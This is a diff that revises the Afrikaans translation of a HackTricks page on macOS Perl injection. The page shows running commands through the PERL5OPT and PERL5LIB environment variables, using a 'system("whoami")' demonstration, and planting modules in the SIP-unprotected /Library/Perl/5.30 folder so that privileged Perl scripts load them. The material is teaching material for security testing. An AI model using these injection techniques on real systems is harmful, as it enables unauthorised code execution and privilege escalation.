@@ -1,24 +1,24 @@
-# macOS Perl Aansoekinspuiting
+# macOS Perl Toepassings Inspuiting
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Rooi Span Kenner (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Rooi Span Kenner (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## Via `PERL5OPT` & `PERL5LIB` omgewingsveranderlike
+## Deur `PERL5OPT` & `PERL5LIB` omgewing veranderlike
 
-Deur die omgewingsveranderlike PERL5OPT te gebruik, is dit moontlik om perl arbitrêre bevele uit te voer.\
-Byvoorbeeld, skep hierdie skriffie:
+Deur die omgewing veranderlike PERL5OPT is dit moontlik om perl arbitrêre opdragte uit te voer.\
+Byvoorbeeld, skep hierdie skrip:
 
 {% code title="test.pl" %}
 ```perl
@@ -27,12 +27,12 @@ print "Hello from the Perl script!\n";
 ```
 {% endcode %}
 
-Voer nou die **omgewingsveranderlike uit** en voer die **perl** skrips uit:
+Nou **voer die omgewing veranderlike uit** en voer die **perl** skrip uit:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-'n Ander opsie is om 'n Perl-module te skep (bv. `/tmp/pmod.pm`):
+'n Ander opsie is om 'n Perl-module te skep (bv. `/tmp/pmod.pm`): 
 
 {% code title="/tmp/pmod.pm" %}
 ```perl
@@ -47,13 +47,13 @@ En gebruik dan die omgewingsveranderlikes:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
-## Via afhanklikhede
+## Via dependencies
 
-Dit is moontlik om die afhanklikhede van die Perl wat loop, in die volgorde van die lêer te lys:
+Dit is moontlik om die afhanklikhede gids volgorde van Perl wat loop, te lys:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-Wat sal iets soos die volgende teruggee:
+Wat iets soos die volgende sal teruggee:
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -65,31 +65,31 @@ Wat sal iets soos die volgende teruggee:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-Sommige van die teruggekeerde lêers bestaan selfs nie, maar **`/Library/Perl/5.30`** bestaan wel, dit is **nie beskerm** deur **SIP** en dit is **voor** die lêers wat **beskerm word deur SIP**. Daarom kan iemand daardie lêer misbruik om skrips afhanklikhede daarin by te voeg sodat 'n hoë-privilege Perl-skrip dit kan laai.
+Sommige van die teruggekeerdes vouers bestaan selfs nie, egter, **`/Library/Perl/5.30`** **bestaan**, dit is **nie** **beskerm** deur **SIP** nie en dit is **voor** die vouers **beskerm deur SIP**. Daarom kan iemand daardie vouer misbruik om skrip afhanklikhede daarby te voeg sodat 'n hoë bevoegdheid Perl-skrip dit sal laai.
 
 {% hint style="warning" %}
-Let wel dat jy **root moet wees om in daardie lêer te skryf** en deesdae sal jy hierdie **TCC-prompt** kry:
+Let egter daarop dat jy **root moet wees om in daardie vouer te skryf** en vandag sal jy hierdie **TCC-prompt** ontvang:
 {% endhint %}
 
 <figure><img src="../../../.gitbook/assets/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-Byvoorbeeld, as 'n skrip **`use File::Basename;`** invoer, sou dit moontlik wees om `/Library/Perl/5.30/File/Basename.pm` te skep om dit arbitrêre kode te laat uitvoer.
+Byvoorbeeld, as 'n skrip **`use File::Basename;`** invoer, sal dit moontlik wees om `/Library/Perl/5.30/File/Basename.pm` te skep om dit te laat uitvoer willekeurige kode.
 
-## Verwysings
+## References
 
 * [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)
 
 {% hint style="success" %}
-Leer & oefen AWS Hack: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kyk na die [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) of die [**telegram group**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
